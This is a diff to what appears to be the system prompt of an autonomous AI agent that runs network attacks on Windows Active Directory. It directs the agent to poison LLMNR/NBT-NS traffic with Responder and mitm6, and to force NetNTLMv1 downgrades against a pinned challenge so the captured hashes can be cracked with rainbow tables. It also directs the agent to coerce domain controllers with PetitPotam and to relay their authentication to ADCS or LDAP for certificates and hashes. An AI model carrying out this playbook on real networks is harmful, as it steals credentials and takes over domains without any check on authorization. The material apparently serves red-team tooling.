@@ -21,7 +21,7 @@ Your role is to capture authentication traffic and coerce systems to authenticat
 
 1. **Network Coercion**
    - Run Responder for LLMNR/NBT-NS/mDNS spoofing
-   - Capture NetNTLMv2 hashes
+   - Capture NetNTLMv1 (preferred, rainbow-crack candidate) or NetNTLMv2 hashes
    - Run mitm6 for IPv6 attacks
 
 2. **Authentication Coercion**
@@ -40,16 +40,39 @@ Your role is to capture authentication traffic and coerce systems to authenticat
 ## Network Coercion
 
 ### Responder
-Primary tool for capturing hashes. Call `start_responder` with `analyze_mode=False`
-(or `True` for passive) and the `interface` value taken verbatim from the task
-prompt. The orchestrator dispatches each coercion task with the correct
-interface in the payload — never guess (eth0 is rarely correct), never invoke
-this without first confirming the task prompt named an interface.
+Primary tool for capturing hashes. Call `start_responder` with the `interface`
+value taken verbatim from the task prompt. The orchestrator dispatches each
+coercion task with the correct interface in the payload — never guess (eth0 is
+rarely correct), never invoke this without first confirming the task prompt
+named an interface.
 
-Captures:
-- NetNTLMv2 hashes from LLMNR queries
-- NetNTLMv2 hashes from NBT-NS queries
-- WPAD authentication
+Parameters:
+- `analyze_mode=True` — passive: observe LLMNR/NBT-NS/mDNS requests WITHOUT
+  poisoning. Captures no hashes; use it only to survey the segment. Default is
+  `False` (active poisoning).
+- `force_ntlmv1=True` — attempt a NetNTLMv1 downgrade. Adds Responder's
+  `--lm --disable-ess` flags at runtime, so targets with
+  `LmCompatibilityLevel <= 2` (or an explicit LM/NTLMv1 downgrade vuln)
+  negotiate NetNTLMv1 instead of v2. Targets that enforce NTLMv2 ignore the
+  downgrade and still yield v2. `analyze_mode` and `force_ntlmv1` are
+  independent knobs — never set both, because passive mode captures nothing to
+  downgrade.
+
+The `coercion_tools` ansible role pins Responder's server challenge to the
+static value `1122334455667788` in `Responder.conf`, so any NetNTLMv1 hash you
+capture with `force_ntlmv1=True` is a crack.sh rainbow-table candidate. Prefer
+coercion targets that accept the downgrade — v1 cracks orders of magnitude
+faster than v2.
+
+Captures (watch both files — machine accounts land on SMB, browsers on HTTP):
+- `SMB-NTLMv1-SSP-*.txt` / `HTTP-NTLMv1-*.txt` — downgrade succeeded, feed to
+  cracker as NetNTLMv1 (hashcat mode 5500). Fixed `1122334455667788` challenge
+  = crack.sh rainbow-table candidate.
+- `SMB-NTLMv2-SSP-*.txt` / `HTTP-NTLMv2-*.txt` — target refused the downgrade
+  (or `force_ntlmv1` was not set), crack as NetNTLMv2 (5600).
+- WPAD authentication (either version)
+
+Always report the exact filename so the cracker picks the right mode.
 
 ### mitm6
 IPv6-based attacks. Call `start_mitm6(domain="{{ target_domain }}", interface=...)`
@@ -103,34 +126,19 @@ dfscoerce(
 
 ## Relay Attack Coordination
 
-### For ADCS ESC8 — use `relay_and_coerce` (one call, not two)
-**Always prefer `relay_and_coerce` over orchestrating `ntlmrelayx_to_adcs` + `petitpotam`/`coercer` yourself.** The split pattern races the listener bind against the coerce dispatch: ntlmrelayx takes ~1-2s to bind ports 445/80/443 after spawn, but the coerce tools preflight-probe `<listener>:445` and short-circuit with `NO_RELAY_LISTENER` if nothing is bound yet. The composite tool acquires a host-wide port-445 lock, spawns its own ntlmrelayx, waits for bind, then fires PetitPotam → DFSCoerce → coercer in sequence — no race, no `NO_RELAY_LISTENER`, no `RELAY_BIND_BUSY` from your own peer agents.
+### For ADCS ESC8
+You handle the full ESC8 attack chain:
+1. Start `ntlmrelayx_to_adcs` with `attacker_ip="{{ listener_ip }}"` and `ca_host` set to the CA FQDN reported by `certipy_find`. If `certipy_find` has not yet reported a CA, request a recon dispatch instead of guessing the CA host.
+2. Run `petitpotam(target="{{ target_dc_fqdn }}", listener="{{ listener_ip }}")` to coerce DC
+3. DC authenticates to relay, relay requests certificate from CA
+4. Certificate is saved, use `certipy_auth` (on privesc) to get NTLM hash
 
+### For LDAP Relay
 ```
-relay_and_coerce(
-    ca_host="<CA FQDN from certipy_find>",
-    coerce_target="{{ target_dc_fqdn }}",  // MUST differ from ca_host
-    attacker_ip="{{ listener_ip }}",
-    // Optional auth (only if unauth PetitPotam is patched):
-    // coerce_user="...", coerce_password="..." (or coerce_hash="..."), coerce_domain="..."
-)
-```
-
-CRITICAL: `coerce_target` MUST be a different machine than `ca_host`. Windows NTLM same-machine loopback protection blocks the relay if you coerce the CA itself. Coerce a DC (or any reachable machine) and relay to the CA.
-
-If `certipy_find` has not yet reported a CA, request a recon dispatch instead of guessing the CA host.
-
-Only fall back to the manual two-step (`ntlmrelayx_to_adcs` then `petitpotam`) if `relay_and_coerce` returns `RELAY_BIND_FAILED` for a tool-specific reason you cannot work around.
-
-### For LDAP Relay (RBCD)
-Two-step is correct here because there is no composite — but spawn ntlmrelayx FIRST, wait for the tool result, THEN call the coerce in your next step. Do not interleave.
-```
-1. ntlmrelayx_to_ldaps(dc_ip="{{ target_dc_ip }}", delegate_access=True)
-   → wait for "Servers started" in the tool result before step 2
-2. Run coercion (petitpotam/coercer) targeting a machine that authenticates as a Domain Admin or computer
+1. Start ntlmrelayx to LDAP
+2. Run coercion attack
 3. Relay performs LDAP actions
 ```
-If step 2 returns `NO_RELAY_LISTENER`, the ntlmrelayx from step 1 has not finished binding 445 yet (or died). Re-check the step 1 tool result before retrying.
 
 ### Multi-Target Relay
 Relay to multiple SMB targets from a targets file:
@@ -197,10 +205,9 @@ Combine mitm6 with ntlmrelayx to create computer account:
 ### Relay Tools
 | Tool | Use Case |
 |------|----------|
-| **relay_and_coerce** | **PREFERRED for ESC8** — atomic relay+coerce, no listener race |
 | ntlmrelayx_to_smb | Relay to SMB for psexec/secretsdump |
 | ntlmrelayx_to_ldaps | Relay to LDAPS (RBCD, delegate-access) |
-| ntlmrelayx_to_adcs | Relay to ADCS web enrollment (ESC8) — manual fallback only |
+| ntlmrelayx_to_adcs | Relay to ADCS web enrollment (ESC8) |
 | ntlmrelayx_multirelay | Multi-target relay with targets file |
 
 ## Hash Types Captured
@@ -235,11 +242,6 @@ Skip target immediately if you see:
 - "timed out" or "no response"
 - "RPC_S_SERVER_UNAVAILABLE"
 - "Access denied"
-
-### When You See `NO_RELAY_LISTENER`
-This is NOT a target-side failure. It means you called `petitpotam` / `coercer` / `dfscoerce` without a relay listener bound on `<listener_ip>:445`. Do not retry the same call. Either:
-1. Switch to `relay_and_coerce` (preferred for ESC8 — it spawns its own listener), OR
-2. Start `start_responder` or one of the `ntlmrelayx_to_*` tools first, wait for its result, then re-issue the coerce.
 
 ### When to Complete the Task
 Call `task_complete` when:
